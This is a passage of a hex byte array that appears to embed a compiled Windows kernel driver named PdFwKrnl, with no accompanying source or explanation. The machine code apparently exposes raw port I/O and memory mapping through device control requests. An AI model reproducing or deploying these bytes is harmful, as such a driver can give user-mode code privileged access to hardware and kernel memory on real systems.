		0x00, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0x9D, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0x0C, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00,
		0x00, 0x8B, 0x4E, 0x0C, 0x48, 0x8B, 0xD3, 0x89, 0x08, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0xDD, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0xAE, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0xBA,
		0x04, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCD, 0x48, 0xFF, 0x15, 0x82, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x04, 0x00, 0x00, 0x00, 0xE9, 0x05, 0x02, 0x00, 0x00, 0x8B, 0x56, 0x08, 0x48, 0x8B, 0xCD, 0x48, 0xFF,
		0x15, 0x63, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0xC7, 0x47, 0x30, 0x9A, 0x00, 0x00, 0xC0, 0xE9, 0xE7, 0x01, 0x00, 0x00, 0x83, 0xFA, 0x0C, 0x0F, 0x85, 0xD7, 0x01, 0x00, 0x00, 0x83, 0x7E, 0x04, 0x04, 0x0F, 0x85, 0xCD, 0x01, 0x00,
		0x00, 0x8B, 0x16, 0x90, 0xED, 0x90, 0x89, 0x46, 0x08, 0x48, 0xC7, 0x47, 0x38, 0x04, 0x00, 0x00, 0x00, 0xE9, 0xBF, 0x01, 0x00, 0x00, 0x83, 0xFA, 0x0C, 0x0F, 0x85, 0xAF, 0x01, 0x00, 0x00, 0x83, 0x7E, 0x04, 0x04, 0x0F, 0x85, 0xA5, 0x01, 0x00,
		0x00, 0x8B, 0x16, 0x8B, 0x46, 0x08, 0x90, 0xEF, 0x90, 0x48, 0xC7, 0x47, 0x38, 0x04, 0x00, 0x00, 0x00, 0xE9, 0x97, 0x01, 0x00, 0x00, 0x48, 0x89, 0x5E, 0x08, 0x48, 0x89, 0x5E, 0x10, 0x83, 0xFA, 0x30, 0x0F, 0x85, 0x7F, 0x01, 0x00, 0x00, 0x8B,
		0x0E, 0x49, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xCB, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0xD3, 0x48, 0xFF, 0x15, 0xF4, 0x0D, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x0F,
		0x84, 0x65, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0xC1, 0x0D, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0x4E, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0x46, 0x08, 0x48, 0x89, 0x5E, 0x10, 0x48, 0xC7, 0x47, 0x38,
		0x30, 0x00, 0x00, 0x00, 0xE9, 0x2C, 0x01, 0x00, 0x00, 0x83, 0xFA, 0x30, 0x0F, 0x85, 0x1C, 0x01, 0x00, 0x00, 0x44, 0x8B, 0x46, 0x28, 0x48, 0x8B, 0x56, 0x18, 0x48, 0x8B, 0x4E, 0x10, 0xE8, 0x0D, 0x04, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x30,
		0x00, 0x00, 0x00, 0xE9, 0x05, 0x01, 0x00, 0x00, 0x83, 0xFA, 0x30, 0x0F, 0x85, 0xF5, 0x00, 0x00, 0x00, 0x44, 0x8B, 0x46, 0x28, 0x48, 0x8B, 0x56, 0x10, 0x48, 0x8B, 0x4E, 0x20, 0xE8, 0xE6, 0x03, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x30, 0x00,
		0x00, 0x00, 0xE9, 0xDE, 0x00, 0x00, 0x00, 0x83, 0xFA, 0x30, 0x0F, 0x85, 0xCE, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4E, 0x10, 0x48, 0x85, 0xC9, 0x74, 0x10, 0x48, 0xFF, 0x15, 0x20, 0x0D, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x89, 0x5E,
		0x10, 0x48, 0xC7, 0x47, 0x38, 0x30, 0x00, 0x00, 0x00, 0xE9, 0xAF, 0x00, 0x00, 0x00, 0x83, 0xFA, 0x38, 0x0F, 0x85, 0x9F, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4E, 0x08, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0x92, 0x00, 0x00, 0x00, 0x8B, 0x16, 0x45, 0x33,
		0xC0, 0x48, 0xFF, 0x15, 0xE0, 0x0C, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x8C, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0x46, 0x28, 0x48, 0xC7, 0x47, 0x38, 0x38, 0x00, 0x00, 0x00, 0xEB, 0x71, 0x83, 0xFA, 0x38, 0x75,
		0x65, 0x44, 0x8B, 0x46, 0x30, 0x48, 0x8B, 0x56, 0x18, 0x48, 0x8B, 0x4E, 0x28, 0xE8, 0x56, 0x03, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x38, 0x00, 0x00, 0x00, 0xEB, 0x51, 0x83, 0xFA, 0x38, 0x75, 0x45, 0x44, 0x8B, 0x46, 0x30, 0x48, 0x8B, 0x56,
		0x28, 0x48, 0x8B, 0x4E, 0x20, 0xE8, 0x36, 0x03, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x38, 0x00, 0x00, 0x00, 0xEB, 0x31, 0x83, 0xFA, 0x38, 0x75, 0x25, 0x48, 0x8B, 0x4E, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x23, 0x8B, 0x16, 0x48, 0xFF, 0x15, 0x85,
		0x0C, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x38, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5E, 0x28, 0xEB, 0x07, 0xC7, 0x47, 0x30, 0x0D, 0x00, 0x00, 0xC0, 0x48, 0x8B, 0x6C, 0x24, 0x40, 0x8B, 0x5F, 0x30, 0x33, 0xD2, 0x48,
		0x8B, 0xCF, 0x48, 0xFF, 0x15, 0x97, 0x0C, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xCC, 0x0F, 0x1F, 0x00, 0x69, 0x10, 0x00, 0x00,
		0x09, 0x11, 0x00, 0x00, 0xDE, 0x11, 0x00, 0x00, 0x06, 0x12, 0x00, 0x00, 0x2E, 0x12, 0x00, 0x00, 0x99, 0x12, 0x00, 0x00, 0xE7, 0x12, 0x00, 0x00, 0x16, 0x13, 0x00, 0x00, 0x54, 0x13, 0x00, 0x00, 0x94, 0x13, 0x00, 0x00, 0xC0, 0x12, 0x00, 0x00,
		0x74, 0x13, 0x00, 0x00, 0xC5, 0x13, 0x00, 0x00, 0x00, 0x0C, 0x0C, 0x0C, 0x01, 0x0C, 0x0C, 0x0C, 0x02, 0x0C, 0x0C, 0x0C, 0x03, 0x0C, 0x0C, 0x0C, 0x04, 0x0C, 0x0C, 0x0C, 0x05, 0x0C, 0x0C, 0x0C, 0x06, 0x0C, 0x0C, 0x0C, 0x07, 0x0C, 0x0C, 0x0C,
		0x08, 0x0C, 0x0C, 0x0C, 0x09, 0x0C, 0x0C, 0x0C, 0x0A, 0x0C, 0x0C, 0x0C, 0x0B, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x33, 0xC9, 0x48, 0x8B, 0xC2, 0x89, 0x4A, 0x30, 0x48, 0x89, 0x4A, 0x38,
		0x33, 0xD2, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0xF4, 0x0B, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x40, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B,
		0xF9, 0x48, 0x8D, 0x15, 0x40, 0x0C, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0xFF, 0x15, 0x64, 0x0B, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x58, 0x1B, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x7B, 0x48, 0x8B, 0x10,
		0x48, 0x89, 0x15, 0x49, 0x1B, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x0F, 0x1F, 0x40, 0x00, 0x48, 0x8B, 0x50, 0x08, 0x48, 0x8D, 0x58, 0xF8, 0x48, 0x8B, 0x4B, 0x20, 0x48, 0xFF, 0x15, 0x85, 0x0B, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00,
		0x48, 0x8B, 0x4B, 0x10, 0x48, 0xFF, 0x15, 0x55, 0x0B, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x8B, 0x13, 0x48, 0x8B, 0x4B, 0x18, 0x48, 0xFF, 0x15, 0x2B, 0x0B, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0x48,
		0xFF, 0x15, 0x4A, 0x0B, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xEE, 0x1A, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0x8B, 0x08, 0x48, 0x89, 0x0D, 0xDF, 0x1A, 0x00, 0x00, 0xEB, 0x9D, 0x48, 0x8B, 0x5C, 0x24, 0x40,
		0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0xFF, 0x15, 0xFC, 0x0A, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x10, 0x48, 0x8B, 0x4F, 0x08, 0x48, 0xFF, 0x15, 0xD0, 0x0A, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x83, 0xC4,
		0x30, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x60, 0x48, 0x8B, 0xD9, 0x48, 0xC7, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C,
		0x24, 0x40, 0x48, 0x8D, 0x15, 0x7F, 0x0B, 0x00, 0x00, 0x48, 0xFF, 0x15, 0x78, 0x0A, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x3C, 0x0B, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x48, 0xFF, 0x15, 0x60, 0x0A, 0x00, 0x00,
		0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8D, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x05, 0x48, 0x1A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4C, 0x8D, 0x44, 0x24, 0x40, 0xC6, 0x44, 0x24, 0x28, 0x01, 0x41,
		0xB9, 0x00, 0x80, 0x00, 0x00, 0x33, 0xD2, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0x67, 0x0A, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x64, 0x48, 0x8D, 0x05, 0x8F, 0xFE, 0xFF,
		0xFF, 0x48, 0x89, 0x43, 0x68, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x48, 0x8D, 0x05, 0x4F, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0x43, 0x70, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x48, 0x8D, 0x05, 0xDF, 0xF9, 0xFF, 0xFF, 0x48, 0x89, 0x83, 0xE0, 0x00, 0x00, 0x00,
		0x48, 0x8D, 0x05, 0x31, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0x83, 0x80, 0x00, 0x00, 0x00, 0x48, 0xFF, 0x15, 0x3B, 0x0A, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x8B, 0xD8, 0x85, 0xC0, 0x74, 0x16, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00,
		0x48, 0xFF, 0x15, 0xD1, 0x09, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x60, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xC2, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x25, 0xE2, 0x09, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC1, 0x49, 0x83, 0xF8, 0x08, 0x72,
		0x37, 0x49, 0x83, 0xF8, 0x10, 0x77, 0x11, 0x4C, 0x8B, 0x1A, 0x4A, 0x8B, 0x54, 0x02, 0xF8, 0x4C, 0x89, 0x19, 0x4A, 0x89, 0x54, 0x01, 0xF8, 0xC3, 0x49, 0x83, 0xF8, 0x20, 0x77, 0x5A, 0x0F, 0x10, 0x02, 0x42, 0x0F, 0x10, 0x4C, 0x02, 0xF0, 0x0F,
		0x11, 0x01, 0x42, 0x0F, 0x11, 0x4C, 0x01, 0xF0, 0xC3, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x74, 0x15, 0x48, 0x2B, 0xD1, 0x72, 0x16, 0x44, 0x8A, 0x1C, 0x11, 0x48, 0xFF, 0xC1, 0x49, 0xFF, 0xC8, 0x44, 0x88, 0x59, 0xFF,
		0x75, 0xF0, 0xC3, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x49, 0x03, 0xC8, 0x44, 0x8A, 0x5C, 0x11, 0xFF, 0x48, 0xFF, 0xC9, 0x49, 0xFF, 0xC8, 0x44, 0x88, 0x19, 0x75, 0xF0, 0xC3, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x4E, 0x8D, 0x1C, 0x02, 0x48, 0x2B, 0xD1, 0x73, 0x09, 0x4C, 0x3B, 0xD9, 0x0F, 0x87, 0x6E, 0x01, 0x00, 0x00, 0x0F, 0x10, 0x04, 0x11, 0x48, 0x83, 0xC1, 0x10, 0xF6, 0xC1, 0x0F, 0x74, 0x12, 0x48, 0x83, 0xE1, 0xF0, 0x0F, 0x10, 0x0C, 0x11, 0x0F,
		0x11, 0x00, 0x0F, 0x28, 0xC1, 0x48, 0x83, 0xC1, 0x10, 0x4C, 0x03, 0xC0, 0x4C, 0x2B, 0xC1, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x06, 0x74, 0x6F, 0x49, 0x81, 0xF9, 0x00, 0x10, 0x00, 0x00, 0x0F, 0x87, 0xB3, 0x00, 0x00, 0x00, 0x49, 0x83, 0xE0,
		0x3F, 0xEB, 0x2D, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,
		0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x10, 0x0C, 0x11, 0x0F, 0x10, 0x54, 0x11, 0x10, 0x0F, 0x10, 0x5C, 0x11, 0x20, 0x0F, 0x10, 0x64, 0x11, 0x30, 0x0F, 0x29, 0x41, 0xF0, 0x48, 0x83, 0xC1, 0x40, 0x49, 0xFF, 0xC9, 0x0F, 0x29,
		0x49, 0xC0, 0x0F, 0x29, 0x51, 0xD0, 0x0F, 0x29, 0x59, 0xE0, 0x0F, 0x28, 0xC4, 0x75, 0xD1, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x04, 0x74, 0x19, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x29, 0x41, 0xF0, 0x0F, 0x10, 0x04, 0x11,
		0x48, 0x83, 0xC1, 0x10, 0x49, 0xFF, 0xC9, 0x75, 0xEF, 0x49, 0x83, 0xE0, 0x0F, 0x74, 0x0E, 0x4E, 0x8D, 0x5C, 0x01, 0xF0, 0x41, 0x0F, 0x10, 0x0C, 0x13, 0x41, 0x0F, 0x11, 0x0B, 0x0F, 0x29, 0x41, 0xF0, 0xC3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,
		0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x06, 0x49, 0x83, 0xE0, 0x3F, 0x0F, 0x18, 0x44, 0x11, 0x40, 0xEB, 0x2E, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,
		0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90,
		0x0F, 0x10, 0x0C, 0x11, 0x0F, 0x10, 0x54, 0x11, 0x10, 0x0F, 0x10, 0x5C, 0x11, 0x20, 0x0F, 0x10, 0x64, 0x11, 0x30, 0x0F, 0x2B, 0x41, 0xF0, 0x48, 0x83, 0xC1, 0x40, 0x0F, 0x18, 0x44, 0x11, 0x40, 0x49, 0xFF, 0xC9, 0x0F, 0x2B, 0x49, 0xC0, 0x0F,
		0x2B, 0x51, 0xD0, 0x0F, 0x2B, 0x59, 0xE0, 0x0F, 0x28, 0xC4, 0x75, 0xCC, 0x0F, 0xAE, 0xF8, 0xE9, 0x33, 0xFF, 0xFF, 0xFF, 0x0F, 0x1F, 0x40, 0x00, 0x49, 0x03, 0xC8, 0x0F, 0x10, 0x44, 0x11, 0xF0, 0x48, 0x83, 0xE9, 0x10, 0x49, 0x83, 0xE8, 0x10,
		0xF6, 0xC1, 0x0F, 0x74, 0x18, 0x4C, 0x8B, 0xD9, 0x48, 0x83, 0xE1, 0xF0, 0x0F, 0x10, 0x0C, 0x11, 0x41, 0x0F, 0x11, 0x03, 0x0F, 0x28, 0xC1, 0x4C, 0x8B, 0xC1, 0x4C, 0x2B, 0xC0, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x06, 0x74, 0x39, 0x49, 0x83,
		0xE0, 0x3F, 0xEB, 0x04, 0x0F, 0x1F, 0x40, 0x00, 0x0F, 0x10, 0x4C, 0x11, 0xF0, 0x0F, 0x10, 0x54, 0x11, 0xE0, 0x0F, 0x10, 0x5C, 0x11, 0xD0, 0x0F, 0x10, 0x64, 0x11, 0xC0, 0x0F, 0x29, 0x01, 0x48, 0x83, 0xE9, 0x40, 0x49, 0xFF, 0xC9, 0x0F, 0x29,
		0x49, 0x30, 0x0F, 0x29, 0x51, 0x20, 0x0F, 0x29, 0x59, 0x10, 0x0F, 0x28, 0xC4, 0x75, 0xD1, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x04, 0x74, 0x19, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x29, 0x01, 0x0F, 0x10, 0x44, 0x11, 0xF0,
		0x48, 0x83, 0xE9, 0x10, 0x49, 0xFF, 0xC9, 0x75, 0xEF, 0x49, 0x83, 0xE0, 0x0F, 0x74, 0x0F, 0x4C, 0x8B, 0xD9, 0x4D, 0x2B, 0xD8, 0x41, 0x0F, 0x10, 0x0C, 0x13, 0x41, 0x0F, 0x11, 0x0B, 0x0F, 0x29, 0x01, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD4, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xE4, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFC, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x38, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x4A, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x62, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x86, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xC2, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD6, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEC, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1A, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x16, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x90, 0x16, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x70, 0x16, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xB0, 0x16, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
		0xB0, 0x16, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x60, 0x14, 0x00, 0x00, 0x90, 0x14, 0x00, 0x00, 0x70, 0x15, 0x00, 0x00, 0x70, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x44, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x5C, 0x00, 0x50, 0x00, 0x64, 0x00, 0x46, 0x00, 0x77, 0x00,
		0x4B, 0x00, 0x72, 0x00, 0x6E, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x5C, 0x00, 0x50, 0x00, 0x64, 0x00, 0x46, 0x00, 0x77, 0x00,
		0x4B, 0x00, 0x72, 0x00, 0x6E, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x20, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x98, 0x20, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xC0, 0x20, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
		0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x45, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
